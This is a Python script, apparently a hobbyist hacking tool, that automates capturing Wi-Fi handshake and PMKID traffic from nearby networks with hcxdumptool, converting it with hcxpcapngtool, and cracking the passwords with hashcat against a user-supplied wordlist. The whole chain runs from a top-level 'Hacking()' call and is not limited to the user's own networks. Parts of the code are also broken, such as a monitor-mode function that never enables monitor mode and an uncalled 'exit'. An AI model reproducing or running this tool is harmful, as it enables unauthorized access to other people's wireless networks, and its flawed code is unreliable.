import subprocess
import time
import os

def Hex_Monitor_Mode():
    output1 = subprocess.getoutput("systemctl stop NetworkManager.service")
    output2 = subprocess.getoutput("systemctl stop wpa_supplicant.service")
    

def Disable_Hex_Monitor_Mode():
    output1 = subprocess.getoutput("systemctl start NetworkManager.service")
    output2 = subprocess.getoutput("systemctl start wpa_supplicant.service")
    output3 = subprocess.getoutput("service NetworkManager restart")
    output4 = subprocess.getoutput("iw wlan0 del")

    process = subprocess.Popen("airmon-ng", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
    # Provide input to the program
    input_text = "y\n"  # Include a newline character to simulate pressing Enter
    # Send the input to the program
    process.stdin.write(input_text)
    process.stdin.flush()  # Flush the input buffer
    
    output6 = subprocess.getoutput("airmon-ng stop wlan0mon")
    output7 = subprocess.getoutput("service NetworkManager restart")
    

def capture_data():
    print("Please wait, we will capture packets of available wifi around you for about a minute.")
    print(os.getcwd())
    process = subprocess.Popen("hcxdumptool -i wlan0 -w dumpfile.pcapng", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
    time.sleep(60)
    exit

def Convert_Traffic_Format():
    process = subprocess.getoutput("hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng")

def Launch_HashCat():
    wordlist_location = input("Please provide the path of the wordlist that you want to use: ")
    process = subprocess.getoutput(f"hashcat -m 22000 hash.hc22000 {wordlist_location}")
    print(process)

def Hacking():
    Hex_Monitor_Mode()
    capture_data()
    Disable_Hex_Monitor_Mode()
    Convert_Traffic_Format()
    Launch_HashCat()



Hacking()


def Main_Menu():
    print(""" """)
    print("Please run the program as root!")
    print("1. Enable Monitor Mode")
    print("2. Disable Monitor Mode")
    print("3. Capture Data")

    
#Disable_Hex_Monitor_Mode()
#Hex_Monitor_Mode()
#capture_data()


    
